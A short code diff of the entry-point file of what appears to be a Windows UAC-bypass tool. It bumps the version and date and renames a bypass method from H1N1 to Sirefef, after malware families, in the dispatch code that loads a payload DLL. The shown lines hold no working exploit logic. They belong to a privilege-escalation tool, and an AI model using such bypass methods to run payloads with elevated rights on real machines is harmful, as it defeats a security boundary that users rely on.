@@ -4,9 +4,9 @@
 *
 *  TITLE:       MAIN.C
 *
-*  VERSION:     2.00
+*  VERSION:     2.01
 *
-*  DATE:        16 Nov 2015
+*  DATE:        04 Jan 2016
 *
 *  Program entry point.
 *
@@ -230,7 +230,7 @@ UINT ucmInit(
 		} while (rv != 0);
 
 		UnregisterClass(WndClassName, inst);
-
+		
 		switch (g_ctx.Method) {
 
 		case UacMethodAVrf:
@@ -397,7 +397,7 @@ UINT ucmMain()
 #endif	
 		break;
 
-	case UacMethodH1N1:
+	case UacMethodSirefef:
 		if (g_ctx.osver.dwBuildNumber >= 10548) {
 			if (ucmShowQuestion(UACFIX) == IDNO)
 				return ERROR_UNSUPPORTED_TYPE;
@@ -548,14 +548,14 @@ UINT ucmMain()
 		}
 		break;
 
-	case UacMethodH1N1:
+	case UacMethodSirefef:
 #ifndef _DEBUG
 		if (g_ctx.IsWow64) {
 			ucmShowMessage(WOW64STRING);
 			return ERROR_UNSUPPORTED_TYPE;
 		}
 #endif
-		if (ucmH1N1Method(g_ctx.PayloadDll, g_ctx.PayloadDllSize)) {
+		if (ucmSirefefMethod(g_ctx.PayloadDll, g_ctx.PayloadDllSize)) {
 			return ERROR_SUCCESS;
 		}
 		break;
